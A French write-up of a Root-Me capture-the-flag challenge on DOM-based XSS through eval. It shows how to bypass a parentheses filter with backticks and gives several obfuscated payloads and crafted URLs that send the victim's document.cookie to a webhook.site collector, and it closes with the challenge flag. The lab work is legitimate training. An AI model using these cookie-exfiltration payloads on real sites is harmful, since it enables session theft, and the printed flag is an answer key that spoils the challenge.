# XSS DOM Based – Eval

On arrive sur la chall, et on remarque qu’il faudra voler les cookies de l’admin.

![[DOM_Based_-_Eval_01_8d0a4e6c03.png]]

Apparemment on ne peut pas utiliser de () donc on va mettre des ``

![[DOM_Based_-_Eval_02_19bf3b55be.png]]

Donc il faut qu’il y ait un calcule :

![[DOM_Based_-_Eval_03_8971997c19.png]]

Avec le payload 1+1+alert`1`

On aurait aussi pu utiliser : 

1+1,alert`1`

Il suffit maintenant de récupérer les cookies  avec le(s) payloads suivants :

1+1+setTimeout`eval\\x28atob\\x28\\x22bG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvYjIwMmU2NDAtODhjYi00ODI4LWE1MjctNDljZTY3Yjc4MTA4Lz9jPSIrZG9jdW1lbnQuY29va2llKQ==\\x22\\x29\\x29`

Version non encodé : 1+1+setTimeout`eval\\x28atob\\x28\\x22 location.replace("https://webhook.site/b202e640-88cb-4828-a527-49ce67b78108/?c="+document.cookie)x22\\x29\\x29`

On aurait aussi pu utiliser : 

1+1,window.location=`https://webhook.site/b202e640-88cb-4828-a527-49ce67b78108?c=${document.cookie}`

1*1==1?document.location=" [https://webhook.site/b202e640-88cb-4828-a527-49ce67b78108?c="+document.cookie:3](https://webhook.site/b202e640-88cb-4828-a527-49ce67b78108?c=%22+document.cookie:3)

1+1 && atob`ZG9jdW1lbnQubG9jYXRpb249Ii8vVE9OSVAvIi5jb25jYXQoZG9jdW1lbnQuY29va2llKQ`

(qui est l’encodage de : document.location="//TONIP/".concat(document.cookie))

Et on envoi ca a l’admin :

[http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%2BsetTimeout%60eval%5Cx28atob%5Cx28%5Cx22bG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvYjIwMmU2NDAtODhjYi00ODI4LWE1MjctNDljZTY3Yjc4MTA4Lz9jPSIrZG9jdW1lbnQuY29va2llKQ%3D%3D%5Cx22%5Cx29%5Cx29%60](http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%2BsetTimeout%60eval%5Cx28atob%5Cx28%5Cx22bG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvYjIwMmU2NDAtODhjYi00ODI4LWE1MjctNDljZTY3Yjc4MTA4Lz9jPSIrZG9jdW1lbnQuY29va2llKQ%3D%3D%5Cx22%5Cx29%5Cx29%60)

Ou bien :

[http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%2Cwindow%2Elocation%3D%60https%3A%2F%2Fwebhook%2Esite%2Fb202e640%2D88cb%2D4828%2Da527%2D49ce67b78108%20%3Fc%3D%24%7Bdocument%2Ecookie%7D%60](http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1%2BsetTimeout%60eval%5Cx28atob%5Cx28%5Cx22bG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvYjIwMmU2NDAtODhjYi00ODI4LWE1MjctNDljZTY3Yjc4MTA4Lz9jPSIrZG9jdW1lbnQuY29va2llKQ%3D%3D%5Cx22%5Cx29%5Cx29%60)

Et hop ca flag :   
flag=rootme{Eval_Is_DangER0us}
